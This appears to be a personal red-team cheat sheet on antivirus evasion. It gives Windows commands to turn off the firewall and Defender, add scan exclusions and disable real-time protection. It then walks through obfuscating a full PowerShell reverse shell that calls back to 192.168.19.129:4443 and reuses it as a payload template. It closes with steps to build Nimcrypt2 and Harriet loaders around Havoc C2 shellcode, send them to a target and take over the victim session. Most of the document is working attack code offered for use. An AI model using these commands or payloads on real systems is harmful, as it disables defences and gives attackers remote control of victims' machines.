https://github.com/sinfulz/JustEvadeBro

#### Windows - CMD
```batch - windows
netsh advfirewall show currentprofile
```

```batch - windows
netsh Advfirewall set allprofiles state off
```

#### Windows - PowerShell
To display a list of cmdlets contained in the Defender module, run the following command:
```powershell - windows
Get-Command -Module Defender
```

How to Check if Windows Defender is Running?
```powershell - windows
Get-service Windefend
```

`Running     Windefend          Windows Defender Antivirus Service`

To remove an exception for a specific folder:
```powershell - windows
Add-MpPreference -ExclusionPath C:\Users\scripting\AppData\Local\Temp\Tools
```

#### Disable AntiVirus
If you want to disable Defender real-time protection:
```powershell - windows
Set-MpPreference -DisableRealtimeMonitoring $true
```

To completely disable Windows Defender on a computer, use the command:
```powershell - windows
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
```

#### Windows - RDP

Disable firewall settings form control panel


#### PowerShell manual obfuscation


https://www.youtube.com/watch?v=grSBdZdUya0

First, we can use python to help us generate random variable names:

variableMaker.py
```
import uuid

for i in range(5):
	print(uuid.uuid4().hex)
```

`538a51e8aa53457cb601dd02a400bab6`
`50f1f6254b714beeb46831001a6c0d8d`
`b4fc0ef7c0b84e14908eab3d2cdee855`
`30cc8376e962406993f2277039e78572`
`8b7b10a8012345699cc77439c1fac7ad`

Start replacing the following variables:

`$client`
`$bytes`
`$stream`

`Start-Process $PSHOME\powershell.exe -ArgumentList {$538a51e8aa53457cb601dd02a400bab6 = New-Object System.Net.Sockets.TCPClient('192.168.19.129',4443);$b4fc0ef7c0b84e14908eab3d2cdee855 = $538a51e8aa53457cb601dd02a400bab6.GetStream();[byte[]]$50f1f6254b714beeb46831001a6c0d8d = 0..65535|%{0};while(($i = $b4fc0ef7c0b84e14908eab3d2cdee855.Read($50f1f6254b714beeb46831001a6c0d8d, 0, $50f1f6254b714beeb46831001a6c0d8d.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($50f1f6254b714beeb46831001a6c0d8d,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$b4fc0ef7c0b84e14908eab3d2cdee855.Write($sendbyte,0,$sendbyte.Length);$b4fc0ef7c0b84e14908eab3d2cdee855.Flush()};$538a51e8aa53457cb601dd02a400bab6.Close()} -WindowStyle Hidden`

Next, remove the beginning and end of command:

`$538a51e8aa53457cb601dd02a400bab6 = New-Object System.Net.Sockets.TCPClient('192.168.19.129',4443);$b4fc0ef7c0b84e14908eab3d2cdee855 = $538a51e8aa53457cb601dd02a400bab6.GetStream();[byte[]]$50f1f6254b714beeb46831001a6c0d8d = 0..65535|%{0};while(($i = $b4fc0ef7c0b84e14908eab3d2cdee855.Read($50f1f6254b714beeb46831001a6c0d8d, 0, $50f1f6254b714beeb46831001a6c0d8d.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($50f1f6254b714beeb46831001a6c0d8d,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$b4fc0ef7c0b84e14908eab3d2cdee855.Write($sendbyte,0,$sendbyte.Length);$b4fc0ef7c0b84e14908eab3d2cdee855.Flush()};$538a51e8aa53457cb601dd02a400bab6.Close()`

Next, we can start adding single and double quotes to iex commands

```
$538a51e8aa53457cb601dd02a400bab6 = New-Object System.Net.Sockets.TCPClient('192.168.19.129',4443);$b4fc0ef7c0b84e14908eab3d2cdee855 = $538a51e8aa53457cb601dd02a400bab6.GetStream();[byte[]]$50f1f6254b714beeb46831001a6c0d8d = 0..65535|%{0};while(($i = $b4fc0ef7c0b84e14908eab3d2cdee855.Read($50f1f6254b714beeb46831001a6c0d8d, 0, $50f1f6254b714beeb46831001a6c0d8d.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($50f1f6254b714beeb46831001a6c0d8d,0, $i);$sendback = (i""e''x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p""w''d).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$b4fc0ef7c0b84e14908eab3d2cdee855.Write($sendbyte,0,$sendbyte.Length);$b4fc0ef7c0b84e14908eab3d2cdee855.Flush()};$538a51e8aa53457cb601dd02a400bab6.Close()
```

You can now use this as a template `Villain/Core/payload_templates/windows/netcat/powershell_reverse_tcp.py`

```
data = Start-Process $PSHOME\powershell.exe -ArgumentList {$538a51e8aa53457cb601dd02a400bab6 = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$b4fc0ef7c0b84e14908eab3d2cdee855 = $538a51e8aa53457cb601dd02a400bab6.GetStream();[byte[]]$50f1f6254b714beeb46831001a6c0d8d = 0..65535|%{0};while(($i = $b4fc0ef7c0b84e14908eab3d2cdee855.Read($50f1f6254b714beeb46831001a6c0d8d, 0, $50f1f6254b714beeb46831001a6c0d8d.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($50f1f6254b714beeb46831001a6c0d8d,0, $i);$sendback = (i""e''x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p""w''d).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$b4fc0ef7c0b84e14908eab3d2cdee855.Write($sendbyte,0,$sendbyte.Length);$b4fc0ef7c0b84e14908eab3d2cdee855.Flush()};$538a51e8aa53457cb601dd02a400bab6.Close()} -WindowStyle Hidden
```


#### nimcrypt

Installation:
```
git clone https://github.com/icyguider/Nimcrypt2
```

```
sudo apt install gcc mingw-w64 xz-utils git
```

```
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
```

```
echo “export PATH=$HOME/.nimble/bin:$PATH” >> ~/.bashrc
```

```
export PATH=$HOME/.nimble/bin:$PATH
```

```
nimble install winim nimcrypto docopt ptr_math strenc
```

```
cd Nimcrypt2
```

```
nim c -d=release --cc:gcc --embedsrc=on --hints=on --app=console --cpu=amd64 --out=nimcrypt nimcrypt.nim
```

Using bin shellcode from [[C2 - Havoc]]
```
mv havoc.bin havoc.raw
```

```
./nimcrypt -f /home/kali/Desktop/havoc.raw -t raw -o /home/kali/Desktop/havoc.exe -p svchost -u
```

#### Harriet

```
git clone https://github.com/assume-breach/Home-Grown-Red-Team.git
```

```
cd ~/Desktop/Home-Grown-Red-Team/Harriet
```

```
sudo ./setup.sh
```

```
sudo ./Harriet.sh
```

Select an option (1 for demo)

Select the .bin file created from [[C2 - Havoc]].

Gave malware name.

If you get package error here, try:
[[10._TOOLS/Python#error: externally-managed-environment]]

[[10._TOOLS/Python#Server]]

Send to target and execute.

In Havoc, make take a minute for victim box to show up.

Right click > Interact

![SessionConsoleHelp.png | 1000](https://github.com/HavocFramework/Havoc/blob/main/Assets/Screenshots/SessionConsoleHelp.png?raw=true)



